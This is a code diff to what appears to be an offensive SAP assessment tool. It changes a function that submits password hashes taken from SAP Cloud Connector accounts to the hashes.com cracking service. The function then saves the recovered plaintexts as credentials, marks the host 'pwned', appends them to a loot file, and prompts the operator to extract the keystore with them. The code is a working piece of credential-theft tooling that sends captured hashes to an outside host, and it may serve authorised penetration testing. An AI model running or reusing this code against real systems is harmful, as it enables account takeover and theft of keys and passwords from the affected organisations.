@@ -2405,19 +2405,33 @@ def create_app(api: SAPMAPApi) -> Bottle:
         import urllib.request as _urlreq2
         import urllib.parse as _urlparse
 
-        # Build POST body: hashes[] array
-        # hashes.com expects raw hex hashes (no {SHA} prefix)
+        # Build POST body: hashes[] array.
+        # hashes.com expects raw hex hashes (no {SHA} prefix).  Multiple
+        # SCC users frequently share the same hash (default vendor accounts
+        # like SCC_Support / SCC_Display / SCC_Mon all ship with the same
+        # password), so we de-duplicate the POST payload by hash and keep
+        # a hex -> [user, ...] map to fan results back out to every user
+        # sharing that hash.
         post_params = [("key", api_key)]
-        hash_map = {}  # hex -> {username, algorithm}
+        hash_map = {}  # hex -> list[{username, algorithm, ...}]
         for h in hashes_input:
-            hex_hash = h.get("hash_hex", "").strip()
+            hex_hash = h.get("hash_hex", "").strip().lower()
             if not hex_hash or len(hex_hash) < 8:
                 continue
-            post_params.append(("hashes[]", hex_hash))
-            hash_map[hex_hash.lower()] = h
+            if hex_hash not in hash_map:
+                # First time seeing this hash → submit it to hashes.com
+                post_params.append(("hashes[]", hex_hash))
+                hash_map[hex_hash] = []
+            hash_map[hex_hash].append(h)
 
         if not hash_map:
             return json.dumps({"error": "No valid hex hashes to look up"})
+
+        unique_count = len(hash_map)
+        users_count = sum(len(v) for v in hash_map.values())
+        if unique_count != users_count:
+            print(f"[*] SCC {host}: lookup_hashes — {users_count} user(s) "
+                  f"share {unique_count} unique hash(es); deduped POST")
 
         try:
             body = _urlparse.urlencode(post_params).encode()
@@ -2439,42 +2453,59 @@ def create_app(api: SAPMAPApi) -> Bottle:
         if not resp.get("success"):
             return json.dumps({"error": f"hashes.com: {resp.get('message', 'unknown error')}"})
 
-        # API returns {founds: [...], unfounds: [...]} not {list: [...]}
+        # API returns {founds: [...], unfounds: [...]} not {list: [...]}.
+        # Fan results out to every user sharing each hash so the modal
+        # shows ALL N users (not just the last one we mapped per hash).
+        from sapmap_models import Credentials as _Creds
         results = []
         cracked_count = 0
+        host_slug = host.replace(":", "_").replace("/", "_")
+        loot_dir = os.path.join("loot", "scc", host_slug)
+
         for item in (resp.get("founds") or []):
             hex_hash = (item.get("hash") or "").lower()
             plaintext = item.get("plaintext", "")
-            original = hash_map.get(hex_hash, {})
-            username = original.get("username", "?")
-            results.append({
-                "username": username,
-                "hash_hex": hex_hash,
-                "found": True,
-                "plaintext": plaintext,
-                "algorithm": item.get("algorithm", original.get("algorithm", "")),
-            })
-            if plaintext:
+            users_for_hash = hash_map.get(hex_hash, [])
+            if not users_for_hash:
+                continue
+            for original in users_for_hash:
+                username = original.get("username", "?")
+                results.append({
+                    "username": username,
+                    "hash_hex": hex_hash,
+                    "found": True,
+                    "plaintext": plaintext,
+                    "algorithm": item.get("algorithm",
+                                          original.get("algorithm", "")),
+                })
+                if not plaintext:
+                    continue
                 cracked_count += 1
-                # Store as SCC credential (same as scc_set_credentials)
-                from sapmap_models import Credentials as _Creds
-                sn.credentials = [_Creds(username=username, password=plaintext, verified=False)]
+                # Store as SCC credential.  When several users share the
+                # same plaintext we keep them all in sn.credentials so
+                # subsequent operations (Pull Mappings / Extract Keystore)
+                # can pick whichever username is appropriate; best_credentials()
+                # just uses the first.
+                new_cred = _Creds(username=username, password=plaintext,
+                                  verified=False)
+                if not any(c.username == username and c.password == plaintext
+                           for c in (sn.credentials or [])):
+                    sn.credentials.append(new_cred)
                 sn.pwned = True
                 print(f"[+] SCC {host}: hashes.com cracked {username} → "
                       f"password stored as credential, node marked pwned")
                 sapmap_findings.emit_finding(
                     "CRITICAL", host,
-                    f"SCC password cracked for '{username}' via hashes.com rainbow table — "
-                    f"plaintext stored as SCC credential. "
-                    f"Use 'Pull Mappings' or 'Extract Keystore' without re-entering password.",
+                    f"SCC password cracked for '{username}' via hashes.com "
+                    f"rainbow table — plaintext stored as SCC credential. "
+                    f"Use 'Pull Mappings' or 'Extract Keystore' without "
+                    f"re-entering password.",
                     ref="scc.users.password_cracked",
                     meta={"username": username,
                           "algorithm": item.get("algorithm", ""),
                           "source": "hashes.com"})
-                # Also save to loot
+                # Also append to loot file (one line per user)
                 try:
-                    host_slug = host.replace(":", "_").replace("/", "_")
-                    loot_dir = os.path.join("loot", "scc", host_slug)
                     os.makedirs(loot_dir, exist_ok=True)
                     cracked_path = os.path.join(loot_dir, "hashes_cracked.txt")
                     with open(cracked_path, "a") as fh:
@@ -2485,19 +2516,24 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
         for item in (resp.get("unfounds") or []):
             hex_hash = (item.get("hash") or "").lower()
-            original = hash_map.get(hex_hash, {})
-            results.append({
-                "username": original.get("username", "?"),
-                "hash_hex": hex_hash,
-                "found": False,
-                "plaintext": "",
-                "algorithm": original.get("algorithm", ""),
-            })
+            users_for_hash = hash_map.get(hex_hash, [])
+            for original in users_for_hash:
+                results.append({
+                    "username": original.get("username", "?"),
+                    "hash_hex": hex_hash,
+                    "found": False,
+                    "plaintext": "",
+                    "algorithm": original.get("algorithm", ""),
+                })
+
         cost = resp.get("cost", 0)
         total = len(results)
-        print(f"[*] SCC {host}: hashes.com lookup: {cracked_count}/{total} cracked, cost={cost} credits")
+        print(f"[*] SCC {host}: hashes.com lookup: {cracked_count}/{total} "
+              f"user(s) cracked, {unique_count} unique hash(es) submitted, "
+              f"cost={cost} credits")
         return json.dumps({"ok": True, "results": results,
-                           "cracked": cracked_count, "cost": cost})
+                           "cracked": cracked_count, "cost": cost,
+                           "unique_hashes": unique_count})
 
     # -- Node operations --
     @app.route("/api/node/<sid>/credentials", method="POST")
